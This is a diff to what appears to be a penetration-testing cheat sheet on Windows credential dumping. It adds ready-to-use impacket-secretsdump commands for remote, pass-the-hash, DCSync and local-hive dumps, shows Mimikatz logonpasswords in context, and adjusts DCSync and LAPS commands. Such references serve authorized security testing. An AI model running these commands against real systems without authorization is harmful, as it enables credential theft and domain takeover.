@@ -24,6 +24,24 @@ impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{RHOST}}
 
 Save the whole output. LSA `DefaultPassword` and `_SC_*` entries are plaintext pivots; cached `$DCC2$` lines crack offline. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).
 
+## Secretsdump cheat sheet
+
+Choose the source matching the access you have. Save complete output and label every credential with the host and authority it came from.
+
+```bash
+# Remote password
+impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{RHOST}}
+# Remote NT hash
+impacket-secretsdump -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
+# DCSync with replication rights
+impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{DC}}
+# Local hives or NTDS
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+```
+
+LSA `DefaultPassword` and `_SC_*` entries are plaintext pivots; SAM lines give local hashes; cached `$DCC2$` lines crack offline. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).
+
 ## Mimikatz logon passwords
 
 Run in the target session as administrator or SYSTEM:
@@ -34,7 +52,7 @@ privilege::debug
 sekurlsa::logonpasswords
 ```
 
-Lists in-memory logons: NTLM hashes and plaintext for anyone with a session on the host. Upload the binary with an existing [Evil-WinRM session](services/remote-access#winrm). [Mimikatz sekurlsa module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa).
+Lists in-memory logons: NTLM hashes and plaintext for anyone with a session on the host. Upload the binary with an existing [Evil-WinRM session](services/remote-access#winrm-checks-and-shell). [Mimikatz sekurlsa module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa).
 
 ## Secretsdump from hives
 
@@ -72,7 +90,7 @@ Other object types have their own helpers, e.g. keepass2john. [John the Ripper d
 Requires Replicating Directory Changes permissions, normally a highly privileged or specifically delegated account. Target DC rather than an arbitrary member host.
 
 ```bash
-impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}@{{DC}}'
+impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{DC}}
 ```
 
 Save the complete output and limit later credential tests to intended hosts. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).
@@ -82,7 +100,7 @@ Save the complete output and limit later credential tests to intended hosts. [Im
 Only an account authorized to read the LAPS password attribute can return it. NetExec's laps module checks accessible computer attributes through LDAP.
 
 ```bash
-nxc ldap {{DC}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -M laps
+nxc ldap {{DC}} -u '{{USER}}' -p '{{PASS}}' -M laps
 ```
 
 Treat each recovered local administrator password as host-specific unless reuse is explicitly verified. [Microsoft Windows LAPS access control](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview), [NetExec modules](https://www.netexec.wiki/ldap-protocol/list-modules).
